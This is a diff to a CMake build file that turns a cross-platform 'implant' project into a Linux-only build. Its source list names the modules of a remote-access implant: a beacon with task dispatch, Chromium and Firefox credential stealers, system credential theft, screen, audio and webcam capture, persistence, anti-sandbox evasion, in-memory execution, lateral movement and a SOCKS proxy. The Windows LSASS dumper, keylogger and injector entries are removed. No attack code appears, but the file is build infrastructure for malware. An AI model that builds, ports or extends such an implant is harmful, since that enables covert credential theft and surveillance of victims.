@@ -1,33 +1,21 @@
 cmake_minimum_required(VERSION 3.20)
-project(cross-implant LANGUAGES C CXX)
-
-if(POLICY CMP0135)
-  cmake_policy(SET CMP0135 NEW)
-endif()
+project(linux-implant LANGUAGES C CXX)
 
 set(CMAKE_CXX_STANDARD 20)
 set(CMAKE_CXX_STANDARD_REQUIRED ON)
 set(CMAKE_CXX_EXTENSIONS OFF)
 
 add_definitions(-DSQLITE_OMIT_FTS5)
+add_definitions(-DLINUX)
 
-if(WIN32)
-    include(cmake/CompileOptions.cmake)
-else()
-    add_definitions(-DLINUX)
-endif()
+find_package(OpenSSL REQUIRED)
+find_package(PkgConfig REQUIRED)
+
+pkg_check_modules(X11 REQUIRED x11)
+find_package(JPEG REQUIRED)
+pkg_check_modules(PULSE REQUIRED libpulse libpulse-simple)
 
 include(FetchContent)
-
-if(WIN32)
-    if(MSVC)
-        enable_language(ASM_MASM)
-        set(SYSCALL_STUB src/evasion/SyscallStub_masm.asm)
-    else()
-        enable_language(ASM)
-        set(SYSCALL_STUB src/evasion/SyscallStub_gas.s)
-    endif()
-endif()
 
 # nlohmann-json
 FetchContent_Declare(
@@ -43,12 +31,9 @@ FetchContent_Declare(
   URL https://github.com/google/googletest/archive/refs/heads/main.zip
   DOWNLOAD_EXTRACT_TIMESTAMP TRUE
 )
-if(WIN32)
-    set(gtest_force_shared_crt ON CACHE BOOL "" FORCE)
-endif()
 FetchContent_MakeAvailable(googletest)
 
-set(COMMON_SOURCES
+add_executable(implant
     src/main.cpp
     src/utils/Logger.cpp
     src/utils/Shared.cpp
@@ -56,15 +41,18 @@ set(COMMON_SOURCES
     src/core/ImplantId.cpp
     src/crypto/AesGcm.cpp
     src/crypto/Base64.cpp
+    src/http/HttpClient.cpp
     src/http/RedirectorResolver.cpp
     src/beacon/Beacon.cpp
     src/beacon/TaskDispatcher.cpp
     src/recon/SysInfo.cpp
     src/recon/InstalledSoftware.cpp
+    src/recon/LateralMovement.cpp
     src/persistence/Persistence.cpp
     src/utils/Exec.cpp
     src/credential/ChromiumStealer.cpp
     src/credential/FirefoxStealer.cpp
+    src/credential/SystemCredentials.cpp
     src/capture/Screenshot.cpp
     src/capture/Audio.cpp
     src/capture/Webcam.cpp
@@ -75,62 +63,36 @@ set(COMMON_SOURCES
     src/evasion/AntiSandbox.cpp
     src/evasion/Detection.cpp
     src/evasion/JunkLogic.cpp
+    src/execution/InMemory.cpp
     src/network/SocksProxy.cpp
+    src/wifi/WifiScanner.cpp
     external/sqlite3/sqlite3.c
 )
 
-if(WIN32)
-    set(PLATFORM_SOURCES
-        src/http/WinHttpClient.cpp
-        src/recon/WmiHelpers.cpp
-        src/wifi/WifiDumper.cpp
-        src/capture/Keylogger.cpp
-        src/evasion/Syscalls.cpp
-        ${SYSCALL_STUB}
-        src/evasion/Unhooker.cpp
-        src/evasion/Injector.cpp
-        src/evasion/Bloat.cpp
-        src/execution/DotNetExecutor.cpp
-        src/persistence/ComHijacker.cpp
-        src/credential/LsassDumper.cpp
-        src/lateral/WmiExec.cpp
-        src/lateral/WirelessSpread.cpp
-        src/decoy/BSOD.cpp
-    )
-    add_executable(implant WIN32 ${COMMON_SOURCES} ${PLATFORM_SOURCES})
-    target_link_libraries(implant
-        nlohmann_json::nlohmann_json
-        bcrypt winhttp advapi32 ole32 wbemuuid crypt32 shlwapi gdiplus vfw32 winmm user32 iphlpapi ws2_32 dbghelp wlanapi netapi32 bthprops psapi
-    )
-else()
-    find_package(OpenSSL REQUIRED)
-    find_package(PkgConfig REQUIRED)
-    pkg_check_modules(X11 REQUIRED x11)
+target_include_directories(implant PUBLIC
+    src
+    external
+    external/sqlite3
+    ${OPENSSL_INCLUDE_DIR}
+    ${X11_INCLUDE_DIRS}
+    ${JPEG_INCLUDE_DIR}
+    ${PULSE_INCLUDE_DIRS}
+)
 
-    set(PLATFORM_SOURCES
-        src/http/HttpClient.cpp
-        src/execution/InMemory.cpp
-        src/wifi/WifiScanner.cpp
-    )
-    add_executable(implant ${COMMON_SOURCES} ${PLATFORM_SOURCES})
-    target_include_directories(implant PUBLIC
-        ${OPENSSL_INCLUDE_DIR}
-        ${X11_INCLUDE_DIRS}
-    )
-    # Statically link libstdc++ and libgcc for better compatibility
-    target_link_options(implant PRIVATE -static-libgcc -static-libstdc++)
-    target_link_libraries(implant
-        nlohmann_json::nlohmann_json
-        OpenSSL::SSL
-        OpenSSL::Crypto
-        ${X11_LIBRARIES}
-        pthread
-        dl
-        util
-    )
-endif()
+# Statically link libstdc++ and libgcc for better compatibility
+target_link_options(implant PRIVATE -static-libgcc -static-libstdc++)
 
-target_include_directories(implant PUBLIC src external external/sqlite3)
+target_link_libraries(implant
+    nlohmann_json::nlohmann_json
+    OpenSSL::SSL
+    OpenSSL::Crypto
+    ${X11_LIBRARIES}
+    ${JPEG_LIBRARIES}
+    ${PULSE_LIBRARIES}
+    pthread
+    dl
+    util
+)
 
 # Tests
 add_executable(unit_tests
@@ -140,9 +102,5 @@ add_executable(unit_tests
     src/crypto/AesGcm.cpp
 )
 target_include_directories(unit_tests PRIVATE src)
-if(WIN32)
-    target_link_libraries(unit_tests GTest::gtest_main bcrypt crypt32)
-else()
-    target_link_options(unit_tests PRIVATE -static-libgcc -static-libstdc++)
-    target_link_libraries(unit_tests GTest::gtest_main OpenSSL::Crypto pthread)
-endif()
+target_link_options(unit_tests PRIVATE -static-libgcc -static-libstdc++)
+target_link_libraries(unit_tests GTest::gtest_main OpenSSL::Crypto pthread)
